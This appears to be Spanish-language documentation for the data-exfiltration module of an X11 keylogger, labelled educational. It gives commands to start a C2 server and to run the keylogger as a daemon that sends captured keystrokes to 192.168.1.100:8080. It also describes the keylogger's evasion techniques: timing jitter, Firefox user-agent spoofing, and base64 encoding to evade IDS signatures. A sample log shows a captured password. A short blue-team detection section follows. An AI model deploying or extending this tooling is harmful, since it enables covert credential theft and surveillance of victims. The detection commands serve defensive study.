# Exfiltración de Datos - Documentación

## Descripción

Este módulo implementa la exfiltración de datos capturados por el keylogger hacia un servidor C2 (Comando y Control) remoto.

## Arquitectura

```
┌─────────────────────────┐         HTTP POST         ┌─────────────────────────┐
│     SISTEMA VÍCTIMA     │ ───────────────────────► │    SERVIDOR ATACANTE    │
│                         │        Base64             │                         │
│  x11_keylogger          │     (puerto 8080)         │  c2_server.py           │
│  - Captura teclas       │                           │  - Recibe datos         │
│  - Codifica Base64      │                           │  - Decodifica           │
│  - Envía cada 45-75s    │                           │  - Guarda en archivo    │
└─────────────────────────┘                           └─────────────────────────┘
```

## Componentes

### 1. Cliente (Keylogger)
El keylogger (`src/x11_keylogger.c`) incluye:
- Buffer circular para acumular datos
- Thread de exfiltración en background
- Codificación Base64
- Jitter aleatorio (45-75 segundos)
- Reintentos con backoff exponencial
- User-Agent spoofing (simula Firefox)

### 2. Servidor C2
El servidor (`src/c2_server.py`) proporciona:
- Endpoint HTTP POST para recibir datos
- Decodificación Base64 automática
- Logging a archivo y consola
- Visualización en tiempo real

## Uso Rápido

### Paso 1: Iniciar servidor C2 (en máquina atacante)

```bash
cd src
python3 c2_server.py 8080
```

Salida esperada:
```
╔═══════════════════════════════════════════════════════════╗
║     C2 SERVER - SOLO USO EDUCATIVO                        ║
╚═══════════════════════════════════════════════════════════╝

[2024-12-25 10:00:00] Iniciando servidor C2...
[2024-12-25 10:00:00] Puerto: 8080
[2024-12-25 10:00:00] Endpoint: /upload
[2024-12-25 10:00:00] Servidor escuchando en:
  http://192.168.1.100:8080/upload
```

### Paso 2: Ejecutar keylogger con exfiltración (en máquina víctima)

```bash
# Compilar
make

# Ejecutar con exfiltración habilitada
./x11_keylogger -d -e -s 192.168.1.100 -P 8080

# O con todas las opciones
./x11_keylogger --daemon --exfil --server 192.168.1.100 --exfil-port 8080 --exfil-path /upload
```

## Opciones del Keylogger

| Opción | Descripción |
|--------|-------------|
| `-e, --exfil` | Habilitar exfiltración HTTP |
| `-s, --server HOST` | IP o hostname del servidor C2 |
| `-P, --exfil-port PORT` | Puerto del servidor (default: 8080) |
| `--exfil-path PATH` | Path del endpoint (default: /upload) |

## Opciones del Servidor C2

```bash
python3 c2_server.py [puerto]
```

| Argumento | Descripción |
|-----------|-------------|
| `puerto` | Puerto de escucha (default: 8080) |

## Archivos Generados

### En el servidor C2
- `exfiltrated_data.log` - Contiene todos los datos recibidos con timestamps

### En la víctima
- `keylog.txt` - Log local de teclas (además de la exfiltración)

## Técnicas de Evasión Implementadas

1. **Jitter Temporal**
   - Intervalo aleatorio entre 45-75 segundos
   - Evita detección por patrones de beaconing

2. **User-Agent Spoofing**
   - Simula Firefox 115 en Linux
   - El tráfico parece navegación web normal

3. **Codificación Base64**
   - Evita detección por firmas de texto plano
   - Los IDS no ven "password" o "confidencial" en el payload

4. **Backoff Exponencial**
   - Reintentos progresivos en caso de fallo
   - 1s, 2s, 4s entre intentos

## Ejemplo de Datos Recibidos

```
============================================================
Timestamp: 2024-12-25 10:05:00
Client IP: 192.168.1.50
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
============================================================

--- Ventana activa: Firefox - Login ---
[2024-12-25 10:04:30] [Firefox - Login] m
[2024-12-25 10:04:31] [Firefox - Login] i
[2024-12-25 10:04:31] [Firefox - Login] p
[2024-12-25 10:04:32] [Firefox - Login] a
[2024-12-25 10:04:32] [Firefox - Login] s
[2024-12-25 10:04:33] [Firefox - Login] s
[2024-12-25 10:04:33] [Firefox - Login] w
[2024-12-25 10:04:34] [Firefox - Login] o
[2024-12-25 10:04:34] [Firefox - Login] r
[2024-12-25 10:04:35] [Firefox - Login] d
[2024-12-25 10:04:35] [Firefox - Login] [ENTER]
```

## Detección (Blue Team)

### Indicadores de Compromiso (IOCs)

1. **Nivel de Red**
```bash
# Buscar conexiones HTTP salientes periódicas
sudo tcpdump -i any 'tcp port 8080 and (tcp[tcpflags] & tcp-push != 0)'

# Ver conexiones establecidas
ss -tunap | grep ESTAB | grep 8080
```

2. **Nivel de Proceso**
```bash
# Buscar procesos con conexiones de red
lsof -i :8080

# Ver procesos kworker falsos
ps -eo pid,ppid,comm | grep kworker | awk '$2 != 2 {print}'
```

3. **Análisis de Tráfico**
```bash
# Wireshark filter para detectar beaconing
http.request.method == "POST" && http.user_agent contains "Firefox"
```

## Advertencia Legal

Este código es **EXCLUSIVAMENTE** para:
- Educación en ciberseguridad
- Laboratorios controlados
- Investigación autorizada

El uso no autorizado es **ILEGAL** y puede resultar en consecuencias legales graves.

